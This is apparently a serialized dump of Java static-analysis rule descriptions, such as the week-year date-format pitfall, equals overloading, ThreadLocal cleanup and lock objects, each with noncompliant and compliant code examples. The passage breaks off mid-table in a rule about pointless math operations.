javaS39869Week Year ("YYYY") should not be used for date formatting"MAJOR*java:©<p>Few developers are aware of the difference between <code>Y</code> for "Week year" and <code>y</code> for Year when formatting and parsing a date
with <code>SimpleDateFormat</code>. That's likely because for most dates, Week year and Year are the same, so testing at any time other than the first
or last week of the year will yield the same value for both <code>y</code> and <code>Y</code>. But in the last week of December and the first week of
January, you may get unexpected results.</p>
<p>According to the <a href="http://docs.oracle.com/javase/8/docs/api/java/util/GregorianCalendar.html#week_year">Javadoc</a>:</p>
<blockquote>
  <p>A week year is in sync with a WEEK_OF_YEAR cycle. All weeks between the first and last weeks (inclusive) have the same week year value.
  Therefore, the first and last days of a week year may have different calendar year values.</p>
  <p>For example, January 1, 1998 is a Thursday. If getFirstDayOfWeek() is MONDAY and getMinimalDaysInFirstWeek() is 4 (ISO 8601 standard compatible
  setting), then week 1 of 1998 starts on December 29, 1997, and ends on January 4, 1998. The week year is 1998 for the last three days of calendar
  year 1997. If, however, getFirstDayOfWeek() is SUNDAY, then week 1 of 1998 starts on January 4, 1998, and ends on January 10, 1998; the first three
  days of 1998 then are part of week 53 of 1997 and their week year is 1997.</p>
</blockquote>
<h2>Noncompliant Code Example</h2>
<pre>
Date date = new SimpleDateFormat("yyyy/MM/dd").parse("2015/12/31");
String result = new SimpleDateFormat("YYYY/MM/dd").format(date);   //Noncompliant; yields '2016/12/31'
</pre>
<h2>Compliant Solution</h2>
<pre>
Date date = new SimpleDateFormat("yyyy/MM/dd").parse("2015/12/31");
String result = new SimpleDateFormat("yyyy/MM/dd").format(date);   //Yields '2015/12/31' as expected
</pre>
<h2>Exceptions</h2>
<pre>
Date date = new SimpleDateFormat("yyyy/MM/dd").parse("2015/12/31");
String result = new SimpleDateFormat("YYYY-ww").format(date);  //compliant, 'Week year' is used along with 'Week of year'. result = '2016-01'
</pre>ZBUG
à

java:S1201˘
javaS1201;"equals" method overrides should accept "Object" parameters"MAJOR*java:ö<p>"equals" as a method name should be used exclusively to override <code>Object.equals(Object)</code> to prevent any confusion.</p>
<p>It is tempting to overload the method to take a specific class instead of <code>Object</code> as parameter, to save the class comparison check.
However, this will not work as expected when that is the only override.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class MyClass {
  private int foo = 1;

  public boolean equals(MyClass o) {  // Noncompliant; does not override Object.equals(Object)
    return o != null &amp;&amp; o.foo == this.foo;
  }

  public static void main(String[] args) {
    MyClass o1 = new MyClass();
    Object o2 = new MyClass();
    System.out.println(o1.equals(o2));  // Prints "false" because o2 an Object not a MyClass
  }
}

class MyClass2 {
  public boolean equals(MyClass2 o) {  // Ignored; `boolean equals(Object)` also present
    //..
  }

  public boolean equals(Object o) {
    //...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass {
  private int foo = 1;

  @Override
  public boolean equals(Object o) {
    if (this == o) {
        return true;
    }
    if (o == null || getClass() != o.getClass()) {
      return false;
    }

    MyClass other = (MyClass)o;
    return this.foo == other.foo;
  }

  /* ... */
}

class MyClass2 {
  public boolean equals(MyClass2 o) {
    //..
  }

  public boolean equals(Object o) {
    //...
  }
}
</pre>ZBUG
 

java:S3984ª
javaS39844Exception should not be created without being thrown"MAJOR*java:„<p>Creating a new <code>Throwable</code> without actually throwing it is useless and is probably due to a mistake.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (x &lt; 0)
  new IllegalArgumentException("x must be nonnegative");
</pre>
<h2>Compliant Solution</h2>
<pre>
if (x &lt; 0)
  throw new IllegalArgumentException("x must be nonnegative");
</pre>ZBUG
Ô

java:S1200‡
javaS1200YClasses should not be coupled to too many other classes (Single Responsibility Principle)"MAJOR*java:‹
<p>According to the Single Responsibility Principle, introduced by Robert C. Martin in his book "Principles of Object Oriented Design", a class should
have only one responsibility:</p>
<blockquote>
  <p>If a class has more than one responsibility, then the responsibilities become coupled.</p>
  <p>Changes to one responsibility may impair or inhibit the class' ability to meet the others.</p>
  <p>This kind of coupling leads to fragile designs that break in unexpected ways when changed.</p>
</blockquote>
<p>Classes which rely on many other classes tend to aggregate too many responsibilities and should be split into several smaller ones.</p>
<p>Nested classes dependencies are not counted as dependencies of the outer class.</p>
<h2>Noncompliant Code Example</h2>
<p>With a threshold of 5:</p>
<pre>
class Foo {                        // Noncompliant - Foo depends on too many classes: T1, T2, T3, T4, T5, T6 and T7
  T1 a1;                           // Foo is coupled to T1
  T2 a2;                           // Foo is coupled to T2
  T3 a3;                           // Foo is coupled to T3

  public T4 compute(T5 a, T6 b) {  // Foo is coupled to T4, T5 and T6
    T7 result = a.getResult(b);    // Foo is coupled to T7
    return result;
  }

  public static class Bar {        // Compliant - Bar depends on 2 classes: T8 and T9
    T8 a8;
    T9 a9;
  }
}
</pre>Z
CODE_SMELL
∂

java:S3981ß
javaS3981?Collection sizes and array length comparisons should make sense"MAJOR*java:ƒ<p>The size of a collection and the length of an array are always greater than or equal to zero. So testing that a size or length is greater than or
equal to zero doesn't make sense, since the result is always <code>true</code>. Similarly testing that it is less than zero will always return
<code>false</code>. Perhaps the intent was to check the non-emptiness of the collection or array instead. </p>
<h2>Noncompliant Code Example</h2>
<pre>
if (myList.size() &gt;= 0) { ... }

if (myList.size() &lt; 0) { ... }

boolean result = myArray.length &gt;= 0;

if (0 &gt; myArray.length) { ... }
</pre>
<h2>Compliant Solution</h2>
<pre>
if (!myList.isEmpty()) { ... }

if (myArray.length &gt;= 42) { ... }
</pre>ZBUG
˜

java:S1448Ë
javaS1448(Classes should not have too many methods"MAJOR*java:ï<p>A class that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to maintain.
Above a specific threshold, it is strongly advised to refactor the class into smaller ones which focus on well defined topics.</p>Z
CODE_SMELL
º	

java:S1700≠	
javaS1700=A field should not duplicate the name of its containing class"MAJOR*java:≈<p>It's confusing to have a class member with the same name (case differences aside) as its enclosing class. This is particularly so when you consider
the common practice of naming a class instance for the class itself.</p>
<p>Best practice dictates that any field or member with the same name as the enclosing class be renamed to be more descriptive of the particular
aspect of the class it represents or holds.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo {
  private String foo;

  public String getFoo() { }
}

Foo foo = new Foo();
foo.getFoo() // what does this return?
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Foo {
  private String name;

  public String getName() { }
}

//...

Foo foo = new Foo();
foo.getName()

</pre>
<h2>Exceptions</h2>
<p>When the type of the field is the containing class and that field is static, no issue is raised to allow singletons named like the type. </p>
<pre>
public class Foo {
  ...
  private static Foo foo;
  public Foo getInstance() {
    if(foo==null) {
      foo = new Foo();
    }
    return foo;
  }
  ...
}
</pre>Z
CODE_SMELL
À

java:S1820º
javaS1820'Classes should not have too many fields"MAJOR*java:Í<p>A class that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to maintain, and
having a lot of fields is an indication that a class has grown too large.</p>
<p>Above a specific threshold, it is strongly advised to refactor the class into smaller ones which focus on well defined topics.</p>Z
CODE_SMELL
ﬂ

java:S5164–
javaS5164@"ThreadLocal" variables should be cleaned up when no longer used"MAJOR*java:Ï<p><code>ThreadLocal</code> variables are supposed to be garbage collected once the holding thread is no longer alive. Memory leaks can occur when
holding threads are re-used which is the case on application servers using pool of threads.</p>
<p>To avoid such problems, it is recommended to always clean up <code>ThreadLocal</code> variables using the <code>remove()</code> method to remove
the current thread‚Äôs value for the <code>ThreadLocal</code> variable.</p>
<p>In addition, calling <code>set(null)</code> to remove the value might keep the reference to <code>this</code> pointer in the map, which can cause
memory leak in some scenarios. Using <code>remove</code> is safer to avoid this issue.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class ThreadLocalUserSession implements UserSession {

  private static final ThreadLocal&lt;UserSession&gt; DELEGATE = new ThreadLocal&lt;&gt;();

  public UserSession get() {
    UserSession session = DELEGATE.get();
    if (session != null) {
      return session;
    }
    throw new UnauthorizedException("User is not authenticated");
  }

  public void set(UserSession session) {
    DELEGATE.set(session);
  }

   public void incorrectCleanup() {
     DELEGATE.set(null); // Noncompliant
   }

  // some other methods without a call to DELEGATE.remove()
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class ThreadLocalUserSession implements UserSession {

  private static final ThreadLocal&lt;UserSession&gt; DELEGATE = new ThreadLocal&lt;&gt;();

  public UserSession get() {
    UserSession session = DELEGATE.get();
    if (session != null) {
      return session;
    }
    throw new UnauthorizedException("User is not authenticated");
  }

  public void set(UserSession session) {
    DELEGATE.set(session);
  }

  public void unload() {
    DELEGATE.remove(); // Compliant
  }

  // ...
}
</pre>
<h2>Exceptions</h2>
<p>Rule will not detect non-private <code>ThreadLocal</code> variables, because <code>remove()</code> can be called from another class.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://www.baeldung.com/java-memory-leaks">Understanding Memory Leaks in Java</a> </li>
</ul>ZBUG
ù

java:S1850é
javaS1850M"instanceof" operators that always return "true" or "false" should be removed"MAJOR*java:ù<p><code>instanceof</code> operators that always return <code>true</code> or <code>false</code> are either useless or the result of a misunderstanding
which could lead to unexpected behavior in production.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public boolean isSuitable(Integer param) {
...
  String name = null;

  if (name instanceof String) { // Noncompliant; always false since name is null
    //...
  }

  if(param instanceof Number) {  // Noncompliant; always true unless param is null, because param is an Integer
    doSomething();
  }
...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public boolean isSuitable(Integer param) {
...
  doSomething();
...
}
</pre>
<h2>Deprecated</h2>
<p>This rule is deprecated; use <a href='/coding_rules#rule_key=squid%3AS2589'>S2589</a> instead.</p>ZBUG
Â	

java:S1854÷	
javaS1854$Unused assignments should be removed"MAJOR*java:á	<p>A dead store happens when a local variable is assigned a value that is not read by any subsequent instruction. Calculating or retrieving a value
only to then overwrite it or throw it away, could indicate a serious error in the code. Even if it's not an error, it is at best a waste of resources.
Therefore all calculated values should be used.</p>
<h2>Noncompliant Code Example</h2>
<pre>
i = a + b; // Noncompliant; calculation result not used before value is overwritten
i = compute();
</pre>
<h2>Compliant Solution</h2>
<pre>
i = a + b;
i += compute();
</pre>
<h2>Exceptions</h2>
<p>This rule ignores initializations to -1, 0, 1, <code>null</code>, <code>true</code>, <code>false</code> and <code>""</code>.</p>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/563.html">MITRE, CWE-563</a> - Assignment to Variable without Use ('Unused Variable') </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/QYA5">CERT, MSC13-C.</a> - Detect and remove unused values </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/uQCSBg">CERT, MSC56-J.</a> - Detect and remove superfluous code and values </li>
</ul>Z
CODE_SMELL
∆

java:S1860∑
javaS1860BSynchronization should not be based on Strings or boxed primitives"MAJOR*java:—<p>Objects which are pooled and potentially reused should not be used for synchronization. If they are, it can cause unrelated threads to deadlock
with unhelpful stacktraces. Specifically, <code>String</code> literals, and boxed primitives such as Integers should not be used as lock objects
because they are pooled and reused. The story is even worse for <code>Boolean</code> objects, because there are only two instances of
<code>Boolean</code>, <code>Boolean.TRUE</code> and <code>Boolean.FALSE</code> and every class that uses a Boolean will be referring to one of the
two.</p>
<h2>Noncompliant Code Example</h2>
<pre>
private static final Boolean bLock = Boolean.FALSE;
private static final Integer iLock = Integer.valueOf(0);
private static final String sLock = "LOCK";

public void doSomething() {

  synchronized(bLock) {  // Noncompliant
    // ...
  }
  synchronized(iLock) {  // Noncompliant
    // ...
  }
  synchronized(sLock) {  // Noncompliant
    // ...
  }
</pre>
<h2>Compliant Solution</h2>
<pre>
private static final Object lock1 = new Object();
private static final Object lock2 = new Object();
private static final Object lock3 = new Object();

public void doSomething() {

  synchronized(lock1) {
    // ...
  }
  synchronized(lock2) {
    // ...
  }
  synchronized(lock3) {
    // ...
  }
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/rQGeAQ">CERT, LCK01-J.</a> - Do not synchronize on objects that may be reused </li>
</ul>ZBUG
â	

java:S1862˙
javaS1862BRelated "if/else if" statements should not have the same condition"MAJOR*java:î<p>A chain of <code>if</code>/<code>else if</code> statements is evaluated from top to bottom. At most, only one branch will be executed: the first
one with a condition that evaluates to <code>true</code>. </p>
<p>Therefore, duplicating a condition automatically leads to dead code. Usually, this is due to a copy/paste error. At best, it's simply dead code and
at worst, it's a bug that is likely to induce further bugs as the code is maintained, and obviously it could lead to unexpected behavior. </p>
<h2>Noncompliant Code Example</h2>
<pre>
if (param == 1)
  openWindow();
else if (param == 2)
  closeWindow();
else if (param == 1)  // Noncompliant
  moveWindowToTheBackground();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (param == 1)
  openWindow();
else if (param == 2)
  closeWindow();
else if (param == 3)
  moveWindowToTheBackground();
}

</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>ZBUG
ÿ

java:S2718…
javaS2718H"DateUtils.truncate" from Apache Commons Lang library should not be used"MAJOR*java:÷<p>The use of the <code>ZonedDateTime</code> class introduced in Java 8 to truncate a date can be significantly faster than the <code>DateUtils</code>
class from Commons Lang.</p>
<p><strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is lower than <code>8</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public Date trunc(Date date) {
  return DateUtils.truncate(date, Calendar.SECOND);  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public Date trunc(Date date) {
  Instant instant = date.toInstant();
  ZonedDateTime zonedDateTime = instant.atZone(ZoneId.systemDefault());
  ZonedDateTime truncatedZonedDateTime = zonedDateTime.truncatedTo(ChronoUnit.SECONDS);
  Instant truncatedInstant = truncatedZonedDateTime.toInstant();
  return Date.from(truncatedInstant);
}
</pre>Z
CODE_SMELL
“

java:S3923√
javaS3923WAll branches in a conditional structure should not have exactly the same implementation"MAJOR*java:»<p>Having all branches in a <code>switch</code> or <code>if</code> chain with the same implementation is an error. Either a copy-paste error was made
and something different should be executed, or there shouldn't be a <code>switch</code>/<code>if</code> chain at all.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (b == 0) {  // Noncompliant
  doOneMoreThing();
} else {
  doOneMoreThing();
}

int b = a &gt; 12 ? 4 : 4;  // Noncompliant

switch (i) {  // Noncompliant
  case 1:
    doSomething();
    break;
  case 2:
    doSomething();
    break;
  case 3:
    doSomething();
    break;
  default:
    doSomething();
}
</pre>
<h2>Exceptions</h2>
<p>This rule does not apply to <code>if</code> chains without <code>else</code>-s, or to <code>switch</code>-es without <code>default</code>
clauses.</p>
<pre>
if(b == 0) {    //no issue, this could have been done on purpose to make the code more readable
  doSomething();
} else if(b == 1) {
  doSomething();
}
</pre>ZBUG
Ó


java:S1711ﬂ

javaS17116Standard functional interfaces should not be redefined"MAJOR*java:˛	<p>Just as there is little justification for writing your own String class, there is no good reason to re-define one of the existing, standard
functional interfaces.</p>
<p>Doing so may seem tempting, since it would allow you to specify a little extra context with the name. But in the long run, it will be a source of
confusion, because maintenance programmers will wonder what is different between the custom functional interface and the standard one.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@FunctionalInterface
public interface MyInterface { // Noncompliant
	double toDouble(int a);
}

@FunctionalInterface
public interface ExtendedBooleanSupplier { // Noncompliant
  boolean get();
  default boolean isFalse() {
    return !get();
  }
}

public class MyClass {
    private int a;
    public double myMethod(MyInterface instance){
	return instance.toDouble(a);
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@FunctionalInterface
public interface ExtendedBooleanSupplier extends BooleanSupplier { // Compliant, extends java.util.function.BooleanSupplier
  default boolean isFalse() {
    return !getAsBoolean();
  }
}

public class MyClass {
    private int a;
    public double myMethod(IntToDoubleFunction instance){
	return instance.applyAsDouble(a);
    }
}
</pre>Z
CODE_SMELL
ë

java:S2925Ç
javaS2925*"Thread.sleep" should not be used in tests"MAJOR*java:≠<p>Using <code>Thread.sleep</code> in a test is just generally a bad idea. It creates brittle tests that can fail unpredictably depending on
environment ("Passes on my machine!") or load. Don't rely on timing (use mocks) or use libraries such as <code>Awaitility</code> for asynchroneous
testing. </p>
<h2>Noncompliant Code Example</h2>
<pre>
@Test
public void testDoTheThing(){

  MyClass myClass = new MyClass();
  myClass.doTheThing();

  Thread.sleep(500);  // Noncompliant
  // assertions...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@Test
public void testDoTheThing(){

  MyClass myClass = new MyClass();
  myClass.doTheThing();

  await().atMost(2, Duration.SECONDS).until(didTheThing());  // Compliant
  // assertions...
}

private Callable&lt;Boolean&gt; didTheThing() {
  return new Callable&lt;Boolean&gt;() {
    public Boolean call() throws Exception {
      // check the condition that must be fulfilled...
    }
  };
}
</pre>Z
CODE_SMELL
∑
	java:S124©
javaS124,Track comments matching a regular expression"MAJOR*java:—<p>This rule template can be used to create rules which will be triggered when the full content of a comment matches a given regular expression. Note
that the regular expression should be expressed using the dotall format (where the <code>.</code> character matches any character).</p>
<p>For example, one can create a rule with the regular expression <code>.*REVIEW.*</code> to match all comment containing "REVIEW".</p>
<p>Note that, in order to match REVIEW regardless of the case, the <code>(?i)</code> modifier should be prepended to the expression, as in
<code>(?i).*REVIEW.*</code>.</p>@Z
CODE_SMELL
§
	java:S125ñ
javaS125,Sections of code should not be commented out"MAJOR*java:¿<p>Programmers should not comment out code as it bloats programs and reduces readability.</p>
<p>Unused code should be deleted and can be retrieved from source control history if required.</p>Z
CODE_SMELL
®	
	java:S127ö	
javaS127."for" loop stop conditions should be invariant"MAJOR*java:¬<p>A <code>for</code> loop stop condition should test the loop counter against an invariant value (i.e. one that is true at both the beginning and
ending of every loop iteration). Ideally, this means that the stop condition is set to a local variable just before the loop begins. </p>
<p>Stop conditions that are not invariant are slightly less efficient, as well as being difficult to understand and maintain, and likely lead to the
introduction of errors in the future.</p>
<p>This rule tracks three types of non-invariant stop conditions:</p>
<ul>
  <li> When the loop counters are updated in the body of the <code>for</code> loop </li>
  <li> When the stop condition depend upon a method call </li>
  <li> When the stop condition depends on an object property, since such properties could change during the execution of the loop. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
for (int i = 0; i &lt; 10; i++) {
  ...
  i = i - 1; // Noncompliant; counter updated in the body of the loop
  ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
for (int i = 0; i &lt; 10; i++) {...}
</pre>Z
CODE_SMELL
Ã

java:S1607Ω
javaS1607Tests should not be ignored"MAJOR*java:˜<p>When a test fails due, for example, to infrastructure issues, you might want to ignore it temporarily. But without some kind of notation about why
the test is being ignored, it may never be reactivated. Such tests are difficult to address without comprehensive knowledge of the project, and end up
polluting their projects.</p>
<p>This rule raises an issue for each ignored test that does not have a notation about why it is being skipped.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@Ignore  // Noncompliant
@Test
public void testDoTheThing() {
  // ...
</pre>
<h2>Compliant Solution</h2>
<pre>
@Test
public void testDoTheThing() {
  // ...
</pre>
<h2>Exceptions</h2>
<p>The rule doesn't raise an issue if there is a comment in the @Ignore annotation</p>Z
CODE_SMELL
Ä	

java:S1604Ò
javaS1604HAnonymous inner classes containing only one method should become lambdas"MAJOR*java:˛<p>Before Java 8, the only way to partially support closures in Java was by using anonymous inner classes. But the syntax of anonymous classes may
seem unwieldy and unclear.</p>
<p>With Java 8, most uses of anonymous inner classes should be replaced by lambdas to highly increase the readability of the source code.</p>
<p><strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is lower than <code>8</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
myCollection.stream().map(new Mapper&lt;String,String&gt;() {
  public String map(String input) {
    return new StringBuilder(input).reverse().toString();
  }
});

Predicate&lt;String&gt; isEmpty = new Predicate&lt;String&gt; {
    boolean test(String myString) {
        return myString.isEmpty();
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
myCollection.stream().map(input -&gt; new StringBuilder(input).reverse().toString());

Predicate&lt;String&gt; isEmpty = myString -&gt; myString.isEmpty();
</pre>Z
CODE_SMELL
≤

java:S1849£
javaS18496"Iterator.hasNext()" should not call "Iterator.next()""MAJOR*java:…<p>Calling <code>Iterator.hasNext()</code> is not supposed to have any side effects, and therefore should not change the state of the iterator.
<code>Iterator.next()</code> advances the iterator by one item. So calling it inside <code>Iterator.hasNext()</code>, breaks the
<code>hasNext()</code> contract, and will lead to unexpected behavior in production.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class FibonacciIterator implements Iterator&lt;Integer&gt;{
...
@Override
public boolean hasNext() {
  if(next() != null) {
    return true;
  }
  return false;
}
...
}
</pre>ZBUG
ô


java:S1844ä

javaS1844j"Object.wait(...)" should never be called on objects that implement "java.util.concurrent.locks.Condition""MAJOR*java:ı<p>From the Java API documentation:</p>
<blockquote>
  <p><code>Condition</code> factors out the <code>Object</code> monitor methods (<code>wait</code>, <code>notify</code> and <code>notifyAll</code>)
  into distinct objects to give the effect of having multiple wait-sets per object, by combining them with the use of arbitrary Lock implementations.
  Where a <code>Lock</code> replaces the use of <code>synchronized</code> methods and statements, a <code>Condition</code> replaces the use of the
  <code>Object</code> monitor methods.</p>
</blockquote>
<p>The purpose of implementing the <code>Condition</code> interface is to gain access to its more nuanced <code>await</code> methods. Therefore,
calling the method <code>Object.wait(...)</code> on a class implementing the <code>Condition</code> interface is silly and confusing.</p>
<h2>Noncompliant Code Example</h2>
<pre>
final Lock lock = new ReentrantLock();
final Condition notFull  = lock.newCondition();
...
notFull.wait();
</pre>
<h2>Compliant Solution</h2>
<pre>
final Lock lock = new ReentrantLock();
final Condition notFull  = lock.newCondition();
...
notFull.await();
</pre>Z
CODE_SMELL
‚
	java:S138‘
javaS138&Methods should not have too many lines"MAJOR*java:Ñ<p>A method that grows too large tends to aggregate too many responsibilities. Such method inevitably become harder to understand and therefore harder
to maintain.</p>
<p>Above a specific threshold, it is strongly advised to refactor into smaller methods which focus on well-defined tasks. Those smaller methods will
not only be easier to understand, but also probably easier to test.</p>Z
CODE_SMELL
¯


java:S3039È

javaS30390"String" calls should not go beyond their bounds"MAJOR*java:ï
<p>Just as you can't cut something into three halves, you can't grab a <code>substring</code> that starts or ends outside the original
<code>String</code>'s bounds, you can't use <code>substring</code> to get a reversed portion of a <code>String</code>, and you can't get the
<code>charAt</code> a value that's before the <code>String</code> starts or after it ends.</p>
<p>This rule detects when negative literal or <code>String::length</code> is passed as an argument to the <code>String::substring</code>,
<code>String::charAt</code> and related methods.</p>
<h2>Noncompliant Code Example</h2>
<pre>
String speech = "Now is the time for all good people to come to the aid of their country.";

String substr1 = speech.substring(-1, speech.length());  // Noncompliant; start and end values both bad
String substr2 = speech.substring(speech.length(), 0); // Noncompliant, start value must be &lt; end value
char ch = speech.charAt(speech.length());  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
String speech = "Now is the time for all good people to come to the aid of their country.";

String substr1 = speech; // Closest correct values to original code yield whole string
String substr2 = new StringBuilder(speech).reverse().toString()
char ch = speech.charAt(speech.length()-1);
</pre>ZBUG
Û

java:S4248‰
javaS4248/Regex patterns should not be created needlessly"MAJOR*java:ä<p>The <code>java.util.regex.Pattern.compile()</code> methods have a significant performance cost, and therefore should be used sensibly.</p>
<p>Moreover they are the only mechanism available to create instances of the Pattern class, which are necessary to do any pattern matching using
regular expressions. Unfortunately that can be hidden behind convenience methods like <code>String.matches()</code> or
<code>String.split()</code>.</p>
<p>It is therefore somewhat easy to inadvertently repeatedly compile the same regular expression at great performance cost with no valid reason.</p>
<p>This rule raises an issue when:</p>
<ul>
  <li> A <code>Pattern</code> is compiled from a <code>String</code> literal or constant and is not stored in a static final reference. </li>
  <li> <code>String.matches</code>, <code>String.split</code>, <code>String.replaceAll</code> or <code>String.replaceFirst</code> are invoked with a
  <code>String</code> literal or constant. In which case the code should be refactored to use a <code>java.util.regex.Pattern</code> while respecting
  the previous rule. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
public void doingSomething(String stringToMatch) {
  Pattern regex = Pattern.compile("myRegex");  // Noncompliant
  Matcher matcher = regex.matcher("s");
  // ...
  if (stringToMatch.matches("myRegex2")) {  // Noncompliant
    // ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
private static final Pattern myRegex = Pattern.compile("myRegex");
private static final Pattern myRegex2 = Pattern.compile("myRegex2");

public void doingSomething(String stringToMatch) {
  Matcher matcher = myRegex.matcher("s");
  // ...
  if (myRegex2.matcher(stringToMatch).matches()) {
    // ...
  }
}
</pre>
<h2>Exceptions</h2>
<p><code>String.split</code> doesn't create a regex when the string passed as argument meets either of these 2 conditions:</p>
<ul>
  <li> It is a one-char String and this character is not one of the RegEx's meta characters ".$|()[{^?*+\" </li>
  <li> It is a two-char String and the first char is the backslash and the second is not the ascii digit or ascii letter. </li>
</ul>
<p>In which case no issue will be raised.</p>Z
CODE_SMELL
ü
	java:S110ë
javaS1102Inheritance tree of classes should not be too deep"MAJOR*java:µ<p>Inheritance is certainly one of the most valuable concepts in object-oriented programming. It's a way to compartmentalize and reuse code by
creating collections of attributes and behaviors called classes which can be based on previously created classes. But abusing this concept by creating
a deep inheritance tree can lead to very complex and unmaintainable source code. Most of the time a too deep inheritance tree is due to bad object
oriented design which has led to systematically use 'inheritance' when for instance 'composition' would suit better.</p>
<p>This rule raises an issue when the inheritance tree, starting from <code>Object</code> has a greater depth than is allowed. </p>Z
CODE_SMELL
 
	java:S112º
javaS112)Generic exceptions should never be thrown"MAJOR*java:È<p>Using such generic exceptions as <code>Error</code>, <code>RuntimeException</code>, <code>Throwable</code>, and <code>Exception</code> prevents
calling methods from handling true, system-generated exceptions differently than application-generated errors. </p>
<h2>Noncompliant Code Example</h2>
<pre>
public void foo(String bar) throws Throwable {  // Noncompliant
  throw new RuntimeException("My Message");     // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void foo(String bar) {
  throw new MyOwnRuntimeException("My Message");
}
</pre>
<h2>Exceptions</h2>
<p>Generic exceptions in the signatures of overriding methods are ignored, because overriding method has to follow signature of the throw declaration
in the superclass. The issue will be raised on superclass declaration of the method (or won't be raised at all if superclass is not part of the
analysis).</p>
<pre>
@Override
public void myMethod() throws Exception {...}
</pre>
<p>Generic exceptions are also ignored in the signatures of methods that make calls to methods that throw generic exceptions.</p>
<pre>
public void myOtherMethod throws Exception {
  doTheThing();  // this method throws Exception
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/397.html">MITRE, CWE-397</a> - Declaration of Throws for Generic Exception </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/BoB3AQ">CERT, ERR07-J.</a> - Do not throw RuntimeException, Exception, or Throwable
  </li>
</ul>Z
CODE_SMELL
ç

java:S3034˛
javaS3034SRaw byte values should not be used in bitwise operations in combination with shifts"MAJOR*java:á<p>When reading bytes in order to build other primitive values such as <code>int</code>s or <code>long</code>s, the <code>byte</code> values are
automatically promoted, but that promotion can have unexpected results.</p>
<p>For instance, the binary representation of the integer 640 is <code>0b0000_0010_1000_0000</code>, which can also be written with the array of
(unsigned) bytes <code>[2, 128]</code>. However, since Java uses two's complement, the representation of the integer in signed bytes will be <code>[2,
-128]</code> (because the <code>byte</code> <code>0b1000_0000</code> is promoted to the <code>int</code>
<code>0b1111_1111_1111_1111_1111_1111_1000_0000</code>). Consequently, trying to reconstruct the initial integer by shifting and adding the values of
the bytes without taking care of the sign will not produce the expected result. </p>
<p>To prevent such accidental value conversion, use bitwise and (<code>&amp;</code>) to combine the <code>byte</code> value with <code>0xff</code>
(255) and turn all the higher bits back off.</p>
<p>This rule raises an issue any time a <code>byte</code> value is used as an operand without <code>&amp; 0xff</code>, when combined with shifts.</p>
<h2>Noncompliant Code Example</h2>
<pre>
  int intFromBuffer() {
    int result = 0;
    for (int i = 0; i &lt; 4; i++) {
      result = (result &lt;&lt; 8) | readByte(); // Noncompliant
    }
    return result;
  }
</pre>
<h2>Compliant Solution</h2>
<pre>
  int intFromBuffer() {
    int result = 0;
    for (int i = 0; i &lt; 4; i++) {
      result = (result &lt;&lt; 8) | (readByte() &amp; 0xff);
    }
    return result;
  }
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/SAHEAw">CERT, NUM52-J.</a> - Be aware of numeric promotion behavior </li>
</ul>ZBUG
«
	java:S103π
javaS103Lines should not be too long"MAJOR*java:t<p>Having to scroll horizontally makes it harder to get a quick overview and understanding of any piece of code.</p>Z
CODE_SMELL
´

java:S2185ú
javaS2185"Silly math should not be performed"MAJOR*java:œ<p>Certain math operations are just silly and should not be performed because their results are predictable.</p>
<p>In particular, <code>anyValue % 1</code> is silly because it will always return 0.</p>
<p>Casting a non-floating-point value to floating-point and then passing it to <code>Math.round</code>, <code>Math.ceil</code>, or
<code>Math.floor</code> is silly because the result will always be the original value. </p>
<p>These operations are silly with any constant value: <code>Math.abs</code>, <code>Math.ceil</code>, <code>Math.floor</code>, <code>Math.rint</code>,
<code>Math.round</code>.</p>
<p>And these oprations are silly with certain constant values:</p>
<table>
  <tbody>
    <tr>
      <th>Operation</th>
      <th>Value</th>
    </tr>
    <tr>
      <td>acos</td>
      <td>0.0 or 1.0</td>
    </tr>
    <tr>
      <td>asin</td>
      <td>0.0 or 1.0</td>
    </tr>
    <tr>
      <td>atan</td>
      <td>0.0 or 1.0</td>
    </tr>
    <tr>
      <td>atan2</td>
      <td>0.0</td>
    </tr>
    <tr>
      <td>cbrt</td>
      <td>0.0 or 1.0</td>
    </tr>
    <tr>
      <td>cos</td>
      <td>0.0</td>
    </tr>
    <tr>
      <td>cosh</td>
      <td>0.0</td>
    </tr>
    <tr>
      <td>exp</td>
